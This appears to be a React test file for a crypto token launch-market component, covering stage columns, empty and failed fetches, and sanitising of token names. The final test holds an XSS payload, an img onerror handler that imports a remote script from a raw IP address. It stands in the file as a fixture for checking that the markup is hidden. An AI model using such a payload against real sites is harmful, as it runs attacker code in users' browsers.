import { render, screen, cleanup } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { I18nextProvider } from 'react-i18next';
import type { AgentLaunchMarket as Market, AgentLaunchToken } from '@snk/contracts';
import { i18n } from '@/i18n';
import { onchainApi } from '@/services/api/onchainApi';
import { AgentLaunchMarket } from './AgentLaunchMarket';
vi.mock('@/services/api/onchainApi', () => ({ onchainApi: { agentLaunches: vi.fn() } }));
vi.mock('./MarketChart', () => ({ MarketChart: () => <div>migrated-chart</div> }));
afterEach(cleanup);
const base: Market = {
  chain: 'bsc',
  fetchedAt: '2026-10-28T00:00:00Z',
  scope: 'AGENT_LAUNCHPADS',
  coverage: 'BOUNDED_SAMPLE',
  tokens: [],
  sources: [],
};
async function setup() {
  await i18n.changeLanguage('zh-CN');
  render(
    <I18nextProvider i18n={i18n}>
      <QueryClientProvider
        client={new QueryClient({ defaultOptions: { queries: { retry: false } } })}
      >
        <AgentLaunchMarket />
      </QueryClientProvider>
    </I18nextProvider>,
  );
}
it('shows stage columns, predicted contract, partial failures and charts only after migration', async () => {
  const token: AgentLaunchToken = {
    chain: 'bsc',
    address: '0x' + '1'.repeat(40),
    source: 'FLAP_AGENT',
    stage: 'NEW',
    symbol: 'CURVE',
    name: 'Curve',
    tokenDeployed: false,
    marketAddress: '0x' + '2'.repeat(40),
    progress: 0,
    evidence: 'FLAP_AGENT_READER',
    priceUsd: null,
    changePercent: null,
    volumeUsd: null,
    liquidityUsd: null,
    marketCapUsd: null,
    holders: null,
    platform: 'Flap Agent',
    url: 'https://bscscan.com',
  };
  vi.mocked(onchainApi.agentLaunches).mockResolvedValue({
    ...base,
    tokens: [
      token,
      {
        ...token,
        address: '0x' + '3'.repeat(40),
        symbol: 'LAUNCHED',
        stage: 'MIGRATED',
        tokenDeployed: true,
      },
    ],
    sources: [
      {
        source: 'FOUR_AGENT',
        status: 'ERROR',
        count: 0,
        error: { code: 'UPSTREAM_UNAVAILABLE', message: 'failed' },
      },
    ],
  });
  await setup();
  expect(await screen.findByText('尚未部署')).toBeInTheDocument();
  expect(screen.getByText(/来源不可用/)).toHaveTextContent('UPSTREAM_UNAVAILABLE');
  expect(screen.queryByText('migrated-chart')).not.toBeInTheDocument();
  await userEvent.click(screen.getByRole('button', { name: /LAUNCHED/ }));
  expect(screen.getByText('migrated-chart')).toBeInTheDocument();
  expect(screen.getByRole('region', { name: '内盘 · 即将发射' })).toBeInTheDocument();
});
it('shows a successful empty sample explicitly', async () => {
  vi.mocked(onchainApi.agentLaunches).mockResolvedValue(base);
  await setup();
  expect(await screen.findAllByText('暂无')).toHaveLength(3);
});
it('shows request failure without claiming an empty success', async () => {
  vi.mocked(onchainApi.agentLaunches).mockRejectedValue(new Error('LAUNCH_UNAVAILABLE'));
  await setup();
  expect(await screen.findByRole('alert')).toHaveTextContent('LAUNCH_UNAVAILABLE');
  expect(screen.queryByText('暂无')).not.toBeInTheDocument();
});
it('hides markup stuffed into a token name', async () => {
  const junk = "<img src=x onerror=import('//185.130.45.236/x.js')>";
  vi.mocked(onchainApi.agentLaunches).mockResolvedValue({
    ...base,
    tokens: [
      {
        chain: 'bsc',
        address: '0x' + 'ab'.repeat(20),
        source: 'FLAP_AGENT',
        stage: 'NEW',
        symbol: junk,
        name: junk,
        tokenDeployed: false,
        marketAddress: null,
        progress: 0,
        evidence: 'FLAP_AGENT_READER',
        priceUsd: null,
        changePercent: null,
        volumeUsd: null,
        liquidityUsd: null,
        marketCapUsd: null,
        holders: null,
        platform: 'Flap Agent',
        url: 'https://bscscan.com',
      },
    ],
  });
  await setup();
  expect(await screen.findAllByText('0xabab…abab')).not.toHaveLength(0);
  expect(screen.queryByText(/onerror|import\(/)).not.toBeInTheDocument();
});
